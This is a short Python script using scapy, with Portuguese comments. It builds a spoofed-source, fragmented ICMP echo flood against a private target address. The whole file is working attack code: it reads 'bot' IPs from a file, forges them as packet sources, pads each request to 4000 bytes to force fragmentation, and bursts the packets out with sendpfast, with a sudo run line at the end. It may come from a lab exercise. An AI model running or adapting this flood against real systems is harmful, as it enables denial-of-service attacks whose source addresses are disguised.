from scapy.all import *
import random
import time
import ipaddress

TARGET_IP = "192.168.100.2"
BOTFILE = "bots.txt"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_flood_attack():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0

    # Define um payload grande para forçar a fragmentação (por exemplo, 4000 bytes)
    icmp_payload = b"A" * 4000

    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        icmp_layer = ICMP(type=8, code=0) / icmp_payload  # Echo Request com payload grande
        packet = ip_layer / icmp_layer
        # Fragmenta o pacote IP (isso retorna uma lista de fragmentos)
        fragments = fragment(packet, fragsize=1480)  # MTU típica menos cabeçalhos
        for frag in fragments:
            lista_de_pacotes.append(eth_layer / frag)
            numero_de_pacotes_enviados += 1
            if numero_de_pacotes_enviados == 100:
                break
        if numero_de_pacotes_enviados == 100:
            break

    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído.")
    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")

if __name__ == "__main__":
    run_icmp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 icmp_frag.py